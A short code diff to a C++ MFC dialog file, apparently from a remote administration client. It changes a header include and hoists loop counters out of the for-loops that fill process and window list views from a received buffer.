@@ -1,7 +1,7 @@
 // SystemDlg.cpp : implementation file
 //
 
-#include "stdafx.h"
+#include "pcl.h"
 #include "Client.h"
 #include "SystemDlg.h"
 
@@ -84,8 +84,9 @@ void CSystemDlg::ShowProcessList()
 	DWORD	dwOffset = 0;
 	CString str;
 	m_list_process.DeleteAllItems();
+	int i = 0;
 
-	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
+	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
 	{
 		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
 		strExeFile = lpBuffer + dwOffset + sizeof(DWORD);
@@ -117,7 +118,9 @@ void CSystemDlg::ShowWindowsList()
 	char	*lpTitle = NULL;
 	m_list_windows.DeleteAllItems();
 	CString	str;
-	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
+	int i = 0;
+
+	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
 	{
 		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
 		lpTitle = (char *)lpBuffer + dwOffset + sizeof(DWORD);
